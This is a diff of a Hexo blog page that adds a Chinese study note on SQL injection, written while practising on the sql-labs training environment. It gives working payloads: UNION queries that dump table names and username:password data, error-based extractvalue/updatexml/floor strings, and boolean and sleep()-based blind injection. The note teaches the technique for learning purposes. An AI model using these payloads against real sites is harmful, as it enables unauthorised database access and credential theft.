@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.8.0">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://example.com/archives/2025/01/"/>
+  
+  <link rel="canonical" href="http://example.com/2025/01/12/sql注入/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,15 +33,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Archive: 2025/1 - Hexo</title>
+  <title>sql注入 - Hexo</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="Hexo - John Doe - Hexo">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2025/01/index.html">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入">
+<meta property="og:url" content="http://example.com/2025/01/12/sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sql注入笔记前言本笔记用于记录学习SQL注入时的笔记，记录了在sql-labs上使用的各种注入方法。 1.注入点判断SQL 注入漏洞根据不同的标准，有不同的分类。如按照参数类型可分为两种：数字型和字符型。 参数类型分类  数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。  如 text.com&#x2F;text.php?id&#x3D;3 对应的sql语句为 select">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2025-01-12T05:28:35.000Z">
+<meta property="article:modified_time" content="2025-01-15T02:54:24.346Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2168,7 +2172,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin end-->
     <!-- front-matter body_begin begin -->
     <!-- front-matter body_begin end -->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2437,7 +2441,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="half" class='cover-wrapper  dock' style="display: ;">
+      <div id="none" class='cover-wrapper post dock' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://gcore.jsdelivr.net/gh/MHG-LAB/cron@gh-pages/bing/bing.jpg"></div>
 
@@ -2512,25 +2516,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-	
-		
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
   <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/12/sql注入/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Hexo">
@@ -2540,172 +2526,346 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/01/12/sql%E6%B3%A8%E5%85%A5/"  itemprop="url">
+    
+    
+      <h1 class="title" itemprop="name headline">
         sql注入
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        sql注入笔记前言本笔记用于记录学习SQL注入时的笔记，记录了在sql-labs上使用的各种注入方法。
-1.注入点判断SQL 注入漏洞根据不同的标准，有不同的分类。如按照参数类型可分为两种：数字型和字符型。
-参数类型分类
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">请设置文章作者</p>
+  </a>
+</div>
 
-数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。
+          
+        
+          
+            
 
-如 text.com&#x2F;text.php?id&#x3D;3 对应的sql语句为 sel...
-      
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-01-12T13:28:35+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Jan 12, 2025</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
     
   </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <h1 id="sql注入笔记"><a href="#sql注入笔记" class="headerlink" title="sql注入笔记"></a>sql注入笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本笔记用于记录学习SQL注入时的笔记，记录了在sql-labs上使用的各种注入方法。</p>
+<h2 id="1-注入点判断"><a href="#1-注入点判断" class="headerlink" title="1.注入点判断"></a>1.注入点判断</h2><p>SQL 注入漏洞根据不同的标准，有不同的分类。如按照参数类型可分为两种：数字型和字符型。</p>
+<p>参数类型分类</p>
+<ol>
+<li>数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</li>
+</ol>
+<p>如 text.com&#x2F;text.php?id&#x3D;3 对应的sql语句为 select * from table where id&#x3D;3</p>
+<ol start="2">
+<li>字符型：字符型注入正好相反</li>
+</ol>
+<p>当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹</p>
+<p>例如数字型语句：select * from table where id &#x3D;3</p>
+<p>则字符型如下：select * from table where name&#x3D;’admin’</p>
+<p><strong>可以通过以下方法判断注入类型</strong></p>
+<p>id&#x3D;1 and 2&#x3D;1 –+;数字型<br>id&#x3D;1 ‘ and 2&#x3D;1–+;字符型<br>主要通过是否需要形成闭环判断，数字型不需形成闭环；</p>
+<p>闭环类型则需要不断尝试才可以判断出</p>
+<h2 id="2-数据表字段数判断"><a href="#2-数据表字段数判断" class="headerlink" title="2.数据表字段数判断"></a>2.数据表字段数判断</h2><p>使用order by n 来判断当前表中存在的字段个数，当n大于当前表中实际的字段个数时会引发报错。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 4 --+ </span></span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+
+
+<h2 id="3-注入手法"><a href="#3-注入手法" class="headerlink" title="3.注入手法"></a>3.注入手法</h2><p>注入手法分类</p>
+<p>1.UNION query SQL injection（联合查询注入）<br>2.Error-based SQL injection（报错注入）<br>3.Boolean-based blind SQL injection（基于布尔的盲注）<br>4.Time-based blind SQL injection（基于时间的盲注）<br>5.Stacked queries SQL injection（堆叠查询SQL注入）</p>
+<p><strong>字符串连接函数介绍</strong></p>
+<ol>
+<li><p>concat(str1,str2,…)——没有分隔符地连接字符串</p>
+</li>
+<li><p>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p>
+</li>
+<li><p>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</p>
+</li>
+</ol>
+<p>说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了。</p>
+<h3 id="1-联合注入-union注入"><a href="#1-联合注入-union注入" class="headerlink" title="1.联合注入(union注入)"></a>1.联合注入(union注入)</h3><p>在网页存在回显时优先使用union注入</p>
+<p>在成功判断注入类型与字段数后即可通过union注入爆数据</p>
+<p>union演示：</p>
+
+
+<p>我们在限定只能显示一行语句的情况下，通过指定一个无法查询到的数据(如id&#x3D;0)导致无法显示，只能显示union 查询内容</p>
+<p>以下为union注入中较为常用的一些函数和环境变量</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>version()</td>
+<td>MySQL 版本</td>
+</tr>
+<tr>
+<td>user()</td>
+<td>当前数据库用户名</td>
+</tr>
+<tr>
+<td>database()</td>
+<td>当前数据库名</td>
+</tr>
+<tr>
+<td>@@version_compile_os</td>
+<td>操作系统版本</td>
+</tr>
+<tr>
+<td>@@datadir</td>
+<td>数据库路径</td>
+</tr>
+</tbody></table>
+<p><strong>爆数据库名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database() --+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>爆数据库表</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#直接套用语句</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>爆数据库字段</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#只需指定表名即可</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">#或者指定当前数据库名</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>爆数据</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#只需指定表名和字段名</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(`id`,&#x27;</span>:<span class="string">&#x27;,`username`,&#x27;</span>:<span class="string">&#x27;,`password`) from users --+</span></span><br><span class="line"><span class="string">#字段值不加反引号也可以</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(id,<span class="string">&#x27;:&#x27;</span>,username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h3><p>在联合查询无法使用的情况下，并且存在报错回显的时候优先使用报错注入</p>
+<p>报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p>
+<p><strong>1.extractvalue()函数</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;)) --+</span></span><br><span class="line"><span class="string">不需要了解函数具体作用，只需更改第二个参数即可</span></span><br></pre></td></tr></table></figure>
+
+<p>通过非法字符与查询内容使用concat()连接，导致报错。concat()中查询方式和union注入一样，但通过报错回显内容字节数有限，可以通过**substr()<strong>函数或</strong>limit()**函数控制报错回显内容</p>
+<p><strong>2.updatexml()</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;^&#x27;</span>,(需要查询的内容),<span class="string">&#x27;^&#x27;</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>也是通过非法字符连接进行报错，感觉和extractvalue()差不多</p>
+<p><strong>3.floor()</strong></p>
+<p>通过floor()函数进行报错有点难，所以使用的优先级最小</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> 查询的内容 <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br><span class="line">通过<span class="built_in">count</span>(<span class="operator">*</span>)在统计rand()提供的随机数的数量时发生报错</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-盲注"><a href="#3-盲注" class="headerlink" title="3.盲注"></a>3.盲注</h3><h4 id="1-布尔盲注"><a href="#1-布尔盲注" class="headerlink" title="1.布尔盲注"></a>1.布尔盲注</h4><p>布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。</p>
+
+
+<ol>
+<li>判断数据库类型</li>
+</ol>
+<ul>
+<li>MySQL数据库表   information_schema.tables</li>
+<li>access           msysobjects </li>
+<li>SQLServer        sysobjects</li>
+</ul>
+<p>一般应该都是MySQL数据库吧</p>
+<p>用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Mysql数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from information_schema.tables) --+</span></span><br><span class="line"><span class="string">//判断是否是 access数据库</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> msysobjects) <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Sqlserver数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from sysobjects) --+</span></span><br></pre></td></tr></table></figure>
+
+<p>正常显示：</p>
+
+
+<p>报错界面：</p>
+
+
+<p>2.判断数据库名</p>
+<p><strong>判断数据库名长度</strong></p>
+<p>通过**length()**函数返回库名长度，与自己提供的数据进行比大小通过是否报错进一步推断出长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())&gt;5 --+</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>判断库名</strong></p>
+<p>通过**ascii()<strong>函数返回字符的ascii码值，与提供数字进行比较。和</strong>substr()**函数控制字符进行判断。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))&gt;115 --+ </span></span><br></pre></td></tr></table></figure>
+
+<p>然后依次判断表名，列名，数据即可。</p>
+<h4 id="3-时间盲注"><a href="#3-时间盲注" class="headerlink" title="3.时间盲注"></a>3.时间盲注</h4><p>在没有回显信息与报错信息也没有布尔类型状态时，我们可以通过时间盲注，推断出数据库的信息。</p>
+<p>时间盲注即和布尔盲注一样通过判断字符推断，只不过将布尔判断改为使用**sleep()<strong>函数，通过加载时间判断语句是否被执行来推断，一般还需结合</strong>if()**函数</p>
+<p>**if()**函数<br>if(1,2,3)函数与PHP中三元运算符类似，当1中语句为真时执行2中语句，否则执行3中语句。</p>
+<p>**sleep()**函数<br>sleep(3)即休息3秒，所以当语句被执行时加载时间会多三秒</p>
+<p>实例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),1,1))&gt;110,sleep(5),0) --+</span></span><br></pre></td></tr></table></figure>
+
+<p>通过if()与sleep()结合判断出具体名字</p>
+<p>其他的以后看见再补充吧</p>
+
+  </div>
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-01-12T13:28:35+08:00">2025-01-12</time>
-        
-      </div>
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='/2025/01/12/sql%E6%B3%A8%E5%85%A5/' itemprop="url">
-            Read More
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-01-15T10:54:24+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Jan 15, 2025</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/03/MySQL/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hexo">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/01/03/MySQL/"  itemprop="url">
-        MySQL
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
     
       
-        MySQL笔记1.MySQL简介数据库（Database）是按照数据结构来组织、存储和管理数据的仓库。
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2025/01/12/sql%E6%B3%A8%E5%85%A5/&title=sql注入 - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2025/01/12/sql%E6%B3%A8%E5%85%A5/&title=sql注入 - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2025/01/12/sql%E6%B3%A8%E5%85%A5/&title=sql注入 - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2025/01/03/MySQL/'>
+          <p class='title'>MySQL<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>MySQL笔记1.MySQL简介数据库（Database）是按照数据结构来组织、存储和管理数据的仓库。
 每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。
-我们也可以将数据存储在文件中，但是在文件中读写数据速度相对较慢。
-所以，现在我们使用关系型数据库管理系统（RDBMS）来存储和管理大数据量。所谓的关系型数据库，是建立在关系模型基础上的数据库，借助于集合...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-01-03T17:06:10+08:00">2025-01-03</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/01/03/MySQL/' itemprop="url">
-            Read More
-          </a>
-        </div>
+我...</p>
+        </a>
       
     </div>
   
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/02/Python/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hexo">
-    <meta itemprop="description" content="">
-  </span>
   
-  
-  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+      <meta itemprop="discussionUrl" content="/2025/01/12/sql%E6%B3%A8%E5%85%A5/index.html#comments">
     </span>
-  
-  
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/01/02/Python/"  itemprop="url">
-        Python
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-01-02T18:38:49+08:00">2025-01-02</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/01/02/Python/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
+    <div id="layoutHelper-comments"></div>
 
-          </div>
-        
-      
-    
-  </section>
-  
-    
-  
+  </article>
 
 
-	
+
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -2714,97 +2874,48 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
-<section class="widget blogger desktop mobile pjax">
-  <div class='content'>
     
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Hexo</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fa-solid fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fa-solid fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-
-    
-  
-
-  
-    
-    
-      
-
-    
-  
-
   
 
 
 <div class="widget-sticky pjax">
 
+  
+  
+
+
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD"><span class="toc-text">1.注入点判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%AD%97%E6%AE%B5%E6%95%B0%E5%88%A4%E6%96%AD"><span class="toc-text">2.数据表字段数判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-text">3.注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-union%E6%B3%A8%E5%85%A5"><span class="toc-text">1.联合注入(union注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">2.报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%9B%B2%E6%B3%A8"><span class="toc-text">3.盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">1.布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">3.时间盲注</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </section>
+
+  
+
 </div>
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
 
   <div class="pjax">
